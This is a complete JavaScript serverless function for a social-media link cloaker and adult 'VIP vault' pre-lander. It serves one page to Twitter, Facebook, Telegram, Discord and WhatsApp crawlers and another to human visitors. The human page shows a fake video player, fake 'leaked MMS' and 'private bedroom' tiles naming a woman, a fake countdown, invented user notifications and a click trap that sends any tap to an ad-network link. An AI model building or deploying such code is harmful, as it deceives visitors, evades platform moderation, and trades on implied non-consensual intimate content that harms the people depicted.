

 /**
 * Vercel Serverless Function: Smart Social Link Cloaker & VIP Vault Pre-Lander
 * File Path: api/index.js
 * Zero external runtime dependencies — uses Tailwind CSS via CDN.
 * Authentic Desi VIP Model Assets hosted on high-speed CDN.
 */

const ADSTERRA_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/q57rx5uii?key=71c304f4b20e2231d1d551e412b40da5";

// Authentic Desi VIP model assets uploaded by user (high-speed ImgBB CDN)
const DEFAULT_AVATAR = "https://i.ibb.co/DHTmNvdT/media-1793206955998-ba56aac0.jpg";
const DEFAULT_BANNER = "https://i.ibb.co/BH7qych6/media-1793206956474-d4ed18e8.webp";

const BOT_SIGNATURES = [
  "twitterbot",
  "facebookexternalhit",
  "telegrambot",
  "discordbot",
  "whatsapp"
];

function escapeHtml(value = "") {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function sanitizeImageUrl(rawImg, defaultUrl = DEFAULT_BANNER) {
  if (!rawImg || typeof rawImg !== "string") return defaultUrl;
  let trimmed = rawImg.trim();
  if (!trimmed) return defaultUrl;

  // Auto-convert Google Drive sharing/view links to direct lh3 links
  const gdriveMatch = trimmed.match(/\/d\/([a-zA-Z0-9_-]+)/);
  if (gdriveMatch && gdriveMatch[1]) {
    return "https://lh3.googleusercontent.com/d/" + gdriveMatch[1];
  }
  const gdriveUcMatch = trimmed.match(/[?&]id=([a-zA-Z0-9_-]+)/);
  if (gdriveUcMatch && gdriveUcMatch[1]) {
    return "https://lh3.googleusercontent.com/d/" + gdriveUcMatch[1];
  }

  if (/^https?:\/\/[^\s"'<>]+$/i.test(trimmed) || /^\/[^\s"'<>]*$/.test(trimmed)) {
    return trimmed;
  }
  return defaultUrl;
}

export function isSocialCrawlerBot(userAgent = "") {
  const normalized = String(userAgent).toLowerCase();
  return BOT_SIGNATURES.some((bot) => normalized.includes(bot));
}

export function renderBotCloakHtml({ imageUrl = DEFAULT_BANNER, pageUrl = "", creatorName = "Priya Sharma" }) {
  const safeImg = escapeHtml(imageUrl);
  const safeUrl = escapeHtml(pageUrl);
  const title = escapeHtml(creatorName + " • Official VIP 18+ Private Vault");
  const description = escapeHtml("Exclusive uncensored MMS tapes, viral private leaks, and private bedroom live stream recordings. Verified VIP Access Only.");

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${title}</title>
  <meta name="description" content="${description}" />

  <!-- OpenGraph Meta Tags for Facebook, Discord, Telegram, WhatsApp -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="${safeUrl}" />
  <meta property="og:title" content="${title}" />
  <meta property="og:description" content="${description}" />
  <meta property="og:image" content="${safeImg}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />

  <!-- Twitter Card Meta Tags for Large Clickable Summary Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="${title}" />
  <meta name="twitter:description" content="${description}" />
  <meta name="twitter:image" content="${safeImg}" />
</head>
<body style="background:#09090b;color:#fafafa;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
  <main style="text-align:center;max-width:460px;padding:24px;">
    <h1 style="font-size:1.25rem;margin-bottom:8px;">${title}</h1>
    <p style="color:#a1a1aa;font-size:0.9rem;">${description}</p>
  </main>
</body>
</html>`;
}

export function renderHumanPrelanderHtml({
  imageUrl = DEFAULT_AVATAR,
  bannerUrl = DEFAULT_BANNER,
  videoPreviewUrl = DEFAULT_BANNER,
  vaultThumbs = [],
  directLink = ADSTERRA_DIRECT_LINK,
  creatorName = "Priya Sharma",
  creatorHandle = "@priyasharma.vip",
  interceptPreview = false
}) {
  const safeAvatar = escapeHtml(imageUrl || DEFAULT_AVATAR);
  const safeBanner = escapeHtml(bannerUrl || DEFAULT_BANNER);
  const safeVideoPreview = escapeHtml(videoPreviewUrl || bannerUrl || DEFAULT_BANNER);
  const safeDirectLink = escapeHtml(directLink);
  const safeCreatorName = escapeHtml(creatorName);
  const safeHandle = escapeHtml(creatorHandle);

  const defaultVaultItems = [
    { title: "Desi Bhabhi Private Bedroom Cam", duration: "16:42", views: "142.8K", tag: "DESI RAW", img: vaultThumbs[0] || safeBanner },
    { title: "Hostel Late Night MMS Tape Uncut", duration: "12:15", views: "198.4K", tag: "LEAKED MMS", img: vaultThumbs[1] || safeAvatar },
    { title: "Mumbai Penthouse Secret Affair", duration: "24:10", views: "215.1K", tag: "4K UNCUT", img: vaultThumbs[2] || safeBanner },
    { title: "Devar Bhabhi Romance Full HD", duration: "18:30", views: "340.6K", tag: "VIRAL DESI", img: vaultThumbs[3] || safeAvatar },
    { title: "Deleted Snapchat Story Full Video", duration: "08:52", views: "98.2K", tag: "PRIVATE", img: vaultThumbs[4] || safeBanner },
    { title: "VIP Subscriber Live Request Show", duration: "27:14", views: "285.9K", tag: "UNCENSORED", img: vaultThumbs[5] || safeAvatar }
  ];

  const vaultCardsHtml = defaultVaultItems
    .map(
      (item, idx) => `
      <button
        type="button"
        data-vault-card="${idx + 1}"
        aria-label="Unlock ${escapeHtml(item.title)} (${escapeHtml(item.duration)})"
        class="group relative aspect-square w-full overflow-hidden rounded-2xl border border-white/10 bg-zinc-900 text-left focus:outline-none focus-visible:ring-2 focus-visible:ring-rose-500"
      >
        <img
          src="${escapeHtml(item.img)}"
          alt="${escapeHtml(item.title)}"
          loading="lazy"
          class="h-full w-full scale-105 object-cover blur-sm brightness-75 transition-transform duration-300 group-hover:scale-120"
        />
        <div class="absolute inset-0 bg-gradient-to-t from-black/95 via-black/45 to-black/25"></div>

        <div class="absolute top-2.5 left-2.5 right-2.5 flex items-center justify-between text-[11px] font-semibold tracking-tight text-white/90">
          <span class="rounded bg-rose-600/90 px-1.5 py-0.5 text-[10px] font-bold uppercase tracking-wider text-white">🔞 ${escapeHtml(item.tag)}</span>
          <span class="font-mono tabular-nums text-zinc-200 bg-black/60 px-1.5 py-0.5 rounded">${escapeHtml(item.duration)}</span>
        </div>

        <div class="absolute inset-x-0 top-1/2 -translate-y-4 flex flex-col items-center justify-center">
          <div class="flex h-10 w-10 items-center justify-center rounded-full border border-white/25 bg-black/65 text-base shadow-lg backdrop-blur-md transition-transform duration-200 group-hover:scale-110">
            🔒
          </div>
        </div>

        <div class="absolute bottom-2.5 left-2.5 right-2.5">
          <p class="truncate text-xs font-semibold text-white">${escapeHtml(item.title)}</p>
          <p class="mt-0.5 truncate font-mono text-[10px] tabular-nums text-zinc-300">${escapeHtml(item.views)} views · Tap to unlock</p>
        </div>
      </button>`
    )
    .join("");

  return `<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>${safeCreatorName} • VIP 18+ Private Vault</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- PASTE YOUR ADSTERRA POPUNDER / SOCIAL BAR SCRIPTS DIRECTLY BELOW HERE -->

  <style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700&family=Outfit:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
    body {
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #07070a;
      color: #f8fafc;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }
    .font-display { font-family: 'Outfit', sans-serif; }
    .font-mono-num { font-family: 'JetBrains Mono', monospace; font-variant-numeric: tabular-nums; }
    @keyframes pulseGlow {
      0%, 100% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0.55), 0 0 35px rgba(244, 63, 94, 0.45); }
      50% { box-shadow: 0 0 0 14px rgba(244, 63, 94, 0), 0 0 50px rgba(244, 63, 94, 0.75); }
    }
    .play-pulse { animation: pulseGlow 2s infinite cubic-bezier(0.16, 1, 0.3, 1); }
  </style>
</head>
<body class="min-h-screen bg-[#07070a] text-zinc-100 selection:bg-rose-500 selection:text-white">

  <!-- Sticky Urgent Top Header -->
  <header class="sticky top-0 z-40 border-b border-white/10 bg-[#09090e]/90 backdrop-blur-xl">
    <div class="mx-auto flex max-w-lg items-center justify-between px-4 py-2.5">
      <div class="flex items-center gap-2 min-w-0">
        <span class="relative flex h-2.5 w-2.5 shrink-0">
          <span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span>
          <span class="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500"></span>
        </span>
        <span class="font-display truncate text-sm font-bold tracking-tight text-white">${safeCreatorName} • VIP 18+</span>
        <svg class="h-4 w-4 shrink-0 text-sky-400" viewBox="0 0 24 24" fill="currentColor" aria-label="Verified Creator">
          <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
        </svg>
      </div>

      <div class="flex items-center gap-1.5 rounded-full border border-rose-500/30 bg-rose-500/15 px-2.5 py-1 text-xs font-semibold text-rose-300 shrink-0">
        <span>Free access closes in</span>
        <span id="countdown-timer" class="font-mono-num font-bold text-rose-200">04:59</span>
      </div>
    </div>
  </header>

  <!-- Main Mobile-First Container -->
  <main id="global-click-zone" class="mx-auto max-w-lg pb-24">

    <!-- Creator Hero Banner + Circular Avatar -->
    <section class="relative">
      <div class="relative h-44 w-full overflow-hidden bg-zinc-900">
        <img
          src="${safeBanner}"
          alt="${safeCreatorName} VIP Cover"
          class="h-full w-full object-cover opacity-85"
        />
        <div class="absolute inset-0 bg-gradient-to-t from-[#07070a] via-[#07070a]/30 to-transparent"></div>
        <div class="absolute top-3 right-3 rounded-full bg-black/65 px-2.5 py-1 text-[11px] font-semibold text-emerald-400 backdrop-blur-md border border-white/10">
          ● LIVE STREAMING NOW
        </div>
      </div>

      <div class="relative -mt-12 px-4 flex items-end justify-between">
        <div class="relative">
          <div class="h-24 w-24 rounded-full bg-gradient-to-tr from-rose-600 via-pink-500 to-amber-400 p-[3px] shadow-2xl">
            <div class="h-full w-full overflow-hidden rounded-full bg-zinc-900">
              <img
                src="${safeAvatar}"
                alt="${safeCreatorName} Avatar"
                class="h-full w-full object-cover"
              />
            </div>
          </div>
          <span class="absolute bottom-1 right-1 h-4 w-4 rounded-full border-2 border-[#07070a] bg-emerald-500" title="Online now"></span>
        </div>

        <button
          type="button"
          class="mb-1 rounded-full bg-gradient-to-r from-rose-600 to-pink-600 px-5 py-2.5 text-xs font-bold uppercase tracking-wider text-white shadow-lg shadow-rose-600/30 transition active:scale-95"
        >
          Unlock Full VIP Free
        </button>
      </div>

      <div class="mt-3 px-4">
        <div class="flex items-center gap-1.5">
          <h1 class="font-display text-xl font-extrabold tracking-tight text-white">${safeCreatorName}</h1>
          <span class="text-xs font-semibold text-rose-400">18+ VERIFIED</span>
        </div>
        <p class="font-mono text-xs text-zinc-400">${safeHandle}</p>

        <!-- Social Proof Stats Bar -->
        <div class="mt-3 grid grid-cols-3 gap-2 rounded-xl border border-white/10 bg-[#0e0e15] p-2.5 text-center">
          <div>
            <p class="font-display text-sm font-bold text-white">52</p>
            <p class="text-[10px] uppercase tracking-wider text-zinc-400">Videos</p>
          </div>
          <div class="border-x border-white/10">
            <p class="font-display text-sm font-bold text-white">184</p>
            <p class="text-[10px] uppercase tracking-wider text-zinc-400">Photos</p>
          </div>
          <div>
            <p class="font-display text-sm font-bold text-rose-400">99.4%</p>
            <p class="text-[10px] uppercase tracking-wider text-zinc-400">Satisfaction</p>
          </div>
        </div>

        <p class="mt-3 text-xs leading-relaxed text-zinc-300">
          🔥 Private desi bedroom tapes, viral MMS leaks, webcam shows & unfiltered VIP content. Tap anywhere to verify your age & start instant HD streaming.
        </p>
      </div>
    </section>

    <!-- Interactive 18+ Fake Video Player with Pulse Glow Play Button -->
    <section class="mt-5 px-4">
      <div class="relative aspect-video w-full overflow-hidden rounded-2xl border border-white/15 bg-zinc-950 shadow-2xl">
        <img
          src="${safeVideoPreview}"
          alt="Video Preview"
          class="h-full w-full object-cover blur-sm brightness-50"
        />
        <div class="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-black/20"></div>

        <!-- Big Pulsing Play Button -->
        <div class="absolute inset-0 flex flex-col items-center justify-center p-4 text-center">
          <div class="play-pulse flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-rose-500 to-pink-600 text-white shadow-2xl transition-transform duration-200 hover:scale-110 active:scale-95">
            <svg class="ml-1 h-8 w-8" viewBox="0 0 24 24" fill="currentColor">
              <path d="M8 5v14l11-7z" />
            </svg>
          </div>

          <div class="mt-3 rounded-md bg-black/80 px-2.5 py-1 text-[11px] font-bold uppercase tracking-wider text-rose-300 backdrop-blur-md border border-rose-500/30">
            18+ Age Verification / Explicit Content Warning
          </div>
          <p class="mt-1 text-xs font-semibold text-white">Click anywhere on screen to play full video uncut</p>
        </div>

        <!-- Player Scrubber Bar Overlay -->
        <div class="absolute inset-x-0 bottom-0 p-3">
          <div class="flex items-center justify-between text-[11px] font-medium text-white/90 mb-1">
            <span class="flex items-center gap-1.5 text-rose-400 font-bold">
              <span class="inline-block h-2 w-2 rounded-full bg-rose-500 animate-pulse"></span>
              UNCENSORED PREVIEW
            </span>
            <span class="font-mono tabular-nums text-zinc-300">0:00 / 3:45 HD</span>
          </div>
          <div class="h-1.5 w-full overflow-hidden rounded-full bg-white/20">
            <div class="h-full w-1/4 rounded-full bg-gradient-to-r from-rose-500 to-pink-500"></div>
          </div>
        </div>
      </div>
    </section>

    <!-- Private Locked Vault Grid (6 Tiles) -->
    <section class="mt-6 px-4">
      <div class="mb-3 flex items-center justify-between">
        <h2 class="font-display text-sm font-bold uppercase tracking-wider text-zinc-200">
          Private Vault Sets (6)
        </h2>
        <span class="rounded bg-rose-500/20 px-2 py-0.5 font-mono text-[11px] font-semibold text-rose-300 border border-rose-500/30">
          FREE ACCESS TODAY
        </span>
      </div>

      <div class="grid grid-cols-2 gap-3">
        ${vaultCardsHtml}
      </div>
    </section>

    <!-- Big Sticky Bottom CTA Button -->
    <div class="fixed inset-x-0 bottom-0 z-30 border-t border-white/10 bg-[#07070a]/95 p-3 backdrop-blur-xl">
      <div class="mx-auto max-w-lg">
        <button
          type="button"
          class="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-rose-600 via-pink-600 to-amber-500 py-3.5 text-sm font-extrabold uppercase tracking-wider text-white shadow-xl shadow-rose-600/30 transition active:scale-[0.98]"
        >
          <span>Watch Free HD Private Video</span>
          <svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3" />
          </svg>
        </button>
      </div>
    </div>

    <!-- Live Social Proof Toast Notification (FOMO) -->
    <div
      id="fomo-toast"
      class="fixed bottom-20 left-4 z-40 max-w-xs rounded-xl border border-white/15 bg-black/85 p-2.5 shadow-2xl backdrop-blur-md transition-all duration-300"
    >
      <div class="flex items-center gap-2">
        <span class="flex h-2 w-2 rounded-full bg-emerald-400"></span>
        <p id="fomo-text" class="text-[11px] font-medium text-zinc-200">
          User @rohit_delhi just unlocked Desi Bhabhi Private Cam!
        </p>
      </div>
    </div>
  </main>

  <script>
    (function () {
      var ADSTERRA_DIRECT_LINK = "${safeDirectLink}";
      var INTERCEPT_PREVIEW = ${interceptPreview ? "true" : "false"};

      function triggerDirectLinkRedirect(e) {
        if (e && e.preventDefault) {
          e.preventDefault();
        }
        if (INTERCEPT_PREVIEW) {
          window.parent.postMessage(
            {
              type: "ADSTERRA_REDIRECT_TRIGGERED",
              targetUrl: ADSTERRA_DIRECT_LINK,
              timestamp: Date.now()
            },
            "*"
          );
          return;
        }
        window.location.href = ADSTERRA_DIRECT_LINK;
      }

      // Global click & touch trap: any click/tap anywhere redirects immediately
      document.addEventListener("click", triggerDirectLinkRedirect, true);

      // Urgent 04:59 Countdown Timer
      var remainingSeconds = 4 * 60 + 59;
      var timerEl = document.getElementById("countdown-timer");
      setInterval(function () {
        if (remainingSeconds > 0) {
          remainingSeconds--;
        } else {
          remainingSeconds = 59;
        }
        var mins = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
        var secs = String(remainingSeconds % 60).padStart(2, "0");
        if (timerEl) {
          timerEl.textContent = mins + ":" + secs;
        }
      }, 1000);

      // Periodic FOMO Notification Popups
      var notifications = [
        "User @rohit_delhi just unlocked Desi Bhabhi Private Cam!",
        "User @vikram_mumbai verified 18+ & started MMS playback!",
        "User @amit_kumar99 unlocked Hostel Late Night Tape!",
        "User @rajesh_vip just accessed all 52 Desi MMS sets!",
        "User @deepak_pune unlocked Devar Bhabhi Romance Full HD!"
      ];
      var toastEl = document.getElementById("fomo-toast");
      var toastText = document.getElementById("fomo-text");
      var idx = 0;

      setInterval(function () {
        if (!toastEl || !toastText) return;
        toastEl.style.opacity = "0";
        toastEl.style.transform = "translateY(12px)";
        setTimeout(function () {
          idx = (idx + 1) % notifications.length;
          toastText.textContent = notifications[idx];
          toastEl.style.opacity = "1";
          toastEl.style.transform = "translateY(0)";
        }, 320);
      }, 4200);
    })();
  </script>
</body>
</html>`;
}

export default function handler(req, res) {
  const query = req.query || {};

  const userAgent =
    (req.headers && (req.headers["user-agent"] || req.headers["User-Agent"])) || "";

  const protocol =
    (req.headers && req.headers["x-forwarded-proto"]) || "https";
  const host =
    (req.headers && req.headers.host) || "fan-page-orpin-mu.vercel.app";

  // Dynamic image parameter (?img=...) with safe Google Drive auto-converter
  const imageUrl = sanitizeImageUrl(query.img, DEFAULT_AVATAR);
  const bannerUrl = sanitizeImageUrl(query.banner, DEFAULT_BANNER);
  const videoPreviewUrl = sanitizeImageUrl(query.preview, DEFAULT_BANNER);
  const directLink =
    typeof query.link === "string" && query.link.trim()
      ? query.link.trim()
      : ADSTERRA_DIRECT_LINK;
  const creatorName =
    typeof query.creator === "string" && query.creator.trim()
      ? query.creator.trim()
      : "Priya Sharma";
  const interceptPreview = query.preview_mode === "1";

  // Allow simulator UA override via query param for live testing
  const effectiveUa =
    typeof query._sim_ua === "string" && query._sim_ua.trim()
      ? query._sim_ua
      : userAgent;

  const pageUrl = protocol + "://" + host + (req.url || "/");

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Cache-Control", "no-store, max-age=0");

  if (isSocialCrawlerBot(effectiveUa)) {
    const botHtml = renderBotCloakHtml({
      imageUrl: query.banner ? sanitizeImageUrl(query.banner) : (query.img ? sanitizeImageUrl(query.img) : DEFAULT_BANNER),
      pageUrl,
      creatorName
    });
    return res.status(200).send(botHtml);
  }

  const vaultThumbs =
    typeof query.thumbs === "string" && query.thumbs.trim()
      ? query.thumbs.split(",").map((u, i) => sanitizeImageUrl(u, i % 2 === 0 ? DEFAULT_BANNER : DEFAULT_AVATAR))
      : [DEFAULT_BANNER, DEFAULT_AVATAR, DEFAULT_BANNER, DEFAULT_AVATAR, DEFAULT_BANNER, DEFAULT_AVATAR];

  const humanHtml = renderHumanPrelanderHtml({
    imageUrl,
    bannerUrl,
    videoPreviewUrl,
    vaultThumbs,
    directLink,
    creatorName,
    interceptPreview
  });

  return res.status(200).send(humanHtml);
}
